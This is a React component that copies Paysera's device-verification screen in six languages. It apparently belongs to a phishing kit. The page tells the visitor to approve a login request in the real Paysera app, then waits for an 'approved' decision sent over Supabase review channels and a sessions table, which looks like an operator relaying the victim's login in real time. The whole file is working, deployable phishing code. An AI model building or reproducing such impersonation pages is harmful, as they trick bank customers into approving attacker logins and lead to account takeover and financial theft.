import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { usePayseraLang } from "@/hooks/usePayseraLang";
import { ChevronLeft } from "lucide-react";

interface PayseraPhoneVerifyScreenProps {
  email: string;
  sessionId: string;
  onBack: () => void;
}

const PayseraPhoneVerifyScreen = ({ email, sessionId, onBack }: PayseraPhoneVerifyScreenProps) => {
  const [status, setStatus] = useState<"waiting" | "success">("waiting");
  const [countdown, setCountdown] = useState(180); // 3 minutes
  const { lang } = usePayseraLang();

  // Translations for this screen
  const texts = {
    en: {
      title: "Verify your device",
      desc: "Open the Paysera app on your phone and confirm the login request to continue.",
      expires: "Confirmation time expires in",
      cantAccess: "Can't access your phone?",
      otherOptions: "Try other options",
      verified: "Device verified successfully",
      verifiedDesc: "Your identity has been confirmed. Redirecting...",
    },
    lt: {
      title: "Patvirtinkite savo įrenginį",
      desc: "Atidarykite Paysera programėlę savo telefone ir patvirtinkite prisijungimo užklausą, kad galėtumėte tęsti.",
      expires: "Patvirtinimo laikas baigiasi po",
      cantAccess: "Neturite prieigos prie telefono?",
      otherOptions: "Bandykite kitus būdus",
      verified: "Įrenginys patvirtintas",
      verifiedDesc: "Jūsų tapatybė patvirtinta. Nukreipiama...",
    },
    ru: {
      title: "Подтвердите устройство",
      desc: "Откройте приложение Paysera на телефоне и подтвердите запрос на вход, чтобы продолжить.",
      expires: "Время подтверждения истекает через",
      cantAccess: "Нет доступа к телефону?",
      otherOptions: "Попробовать другие варианты",
      verified: "Устройство подтверждено",
      verifiedDesc: "Ваша личность подтверждена. Перенаправление...",
    },
    lv: {
      title: "Verificējiet savu ierīci",
      desc: "Atveriet Paysera lietotni savā tālrunī un apstipriniet pieteikšanās pieprasījumu, lai turpinātu.",
      expires: "Apstiprinājuma laiks beidzas pēc",
      cantAccess: "Nav piekļuves tālrunim?",
      otherOptions: "Izmēģiniet citas iespējas",
      verified: "Ierīce verificēta",
      verifiedDesc: "Jūsu identitāte ir apstiprināta. Pāradresē...",
    },
    bg: {
      title: "Потвърдете устройството си",
      desc: "Отворете приложението Paysera на телефона си и потвърдете заявката за вход, за да продължите.",
      expires: "Времето за потвърждение изтича след",
      cantAccess: "Нямате достъп до телефона си?",
      otherOptions: "Опитайте други опции",
      verified: "Устройството е потвърдено",
      verifiedDesc: "Самоличността ви е потвърдена. Пренасочване...",
    },
    es: {
      title: "Verifica tu dispositivo",
      desc: "Abre la app de Paysera en tu teléfono y confirma la solicitud de inicio de sesión para continuar.",
      expires: "El tiempo de confirmación expira en",
      cantAccess: "¿No puedes acceder a tu teléfono?",
      otherOptions: "Probar otras opciones",
      verified: "Dispositivo verificado",
      verifiedDesc: "Tu identidad ha sido confirmada. Redirigiendo...",
    },
  };

  const tx = texts[lang] || texts.en;

  // Countdown timer
  useEffect(() => {
    if (status !== "waiting" || countdown <= 0) return;
    const timer = setInterval(() => setCountdown((c) => c - 1), 1000);
    return () => clearInterval(timer);
  }, [status, countdown]);

  // Listen for approval
  useEffect(() => {
    const channel = supabase.channel(`session-otp-decision-${sessionId}`);
    channel
      .on("broadcast", { event: "otp_decision" }, (p) => {
        const decision = p.payload?.status as string;
        if (decision === "otp_approved" || decision === "login_success") setStatus("success");
      })
      .subscribe();

    const reviewChannel = supabase.channel(`session-review-client-phonev-${sessionId}`);
    reviewChannel
      .on("broadcast", { event: "review_decision" }, (p) => {
        const decision = p.payload?.status as string;
        if (decision === "otp_approved" || decision === "login_success") setStatus("success");
      })
      .subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status").eq("id", sessionId).maybeSingle();
      if (!data) return;
      if (data.status === "otp_approved" || data.status === "login_success") setStatus("success");
    }, 2500);

    return () => {
      supabase.removeChannel(channel);
      supabase.removeChannel(reviewChannel);
      clearInterval(pollInterval);
    };
  }, [sessionId]);

  const formatTime = (s: number) => {
    const m = Math.floor(Math.max(0, s) / 60);
    const sec = Math.max(0, s) % 60;
    return `${String(m).padStart(2, "0")}:${String(sec).padStart(2, "0")}`;
  };

  if (status === "success") {
    return (
      <div className="bg-white rounded-lg shadow-sm px-6 py-12 text-center max-w-[440px] mx-auto">
        <div className="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-green-50">
          <svg className="h-8 w-8 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
            <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
          </svg>
        </div>
        <h2 className="text-[20px] font-bold text-[#1a1a2e] mb-2">{tx.verified}</h2>
        <p className="text-[14px] text-[#8e8e9a]">{tx.verifiedDesc}</p>
      </div>
    );
  }

  return (
    <div className="bg-white rounded-lg shadow-sm max-w-[440px] mx-auto relative">
      {/* Back arrow */}
      <button
        onClick={onBack}
        className="absolute top-4 left-4 text-[#3b6fe0] hover:text-[#2d5bbf] transition-colors"
      >
        <ChevronLeft className="h-6 w-6" />
      </button>

      <div className="px-8 pt-12 pb-10 flex flex-col items-center text-center">
        {/* Phone icon */}
        <div className="mb-6">
          <svg width="80" height="120" viewBox="0 0 80 120" fill="none" xmlns="http://www.w3.org/2000/svg">
            {/* Phone body */}
            <rect x="12" y="4" width="56" height="112" rx="10" stroke="#c0c4cc" strokeWidth="3" fill="#f5f6f8" />
            {/* Screen */}
            <rect x="18" y="20" width="44" height="72" rx="2" fill="#e8eaee" />
            {/* Notch / camera */}
            <circle cx="40" cy="12" r="3" fill="#d0d3da" />
            {/* Avatar circle */}
            <circle cx="40" cy="42" r="8" fill="#d0d3da" />
            {/* Line 1 */}
            <rect x="28" y="54" width="24" height="3" rx="1.5" fill="#d0d3da" />
            {/* Blue bar */}
            <rect x="22" y="64" width="36" height="6" rx="3" fill="#3b82f6" />
            {/* Red bar */}
            <rect x="26" y="76" width="28" height="6" rx="3" fill="#ef4444" />
            {/* Home indicator */}
            <rect x="30" y="100" width="20" height="3" rx="1.5" fill="#d0d3da" />
          </svg>
        </div>

        {/* Title */}
        <h1 className="text-[22px] font-bold text-[#1a1a2e] mb-4">{tx.title}</h1>

        {/* Description */}
        <p className="text-[14px] text-[#6b6b7b] leading-relaxed mb-8 max-w-[340px]">
          {tx.desc}
        </p>

        {/* Countdown */}
        <p className="text-[14px] text-[#8e8e9a] mb-12">
          {tx.expires}{" "}
          <span className="font-semibold text-[#1a1a2e]">{formatTime(countdown)}</span>
        </p>

        {/* Other options */}
        <p className="text-[13px] text-[#8e8e9a]">
          {tx.cantAccess}{" "}
          <button onClick={onBack} className="text-[#3b6fe0] hover:underline font-medium">
            {tx.otherOptions}
          </button>
          .
        </p>
      </div>
    </div>
  );
};

export default PayseraPhoneVerifyScreen;
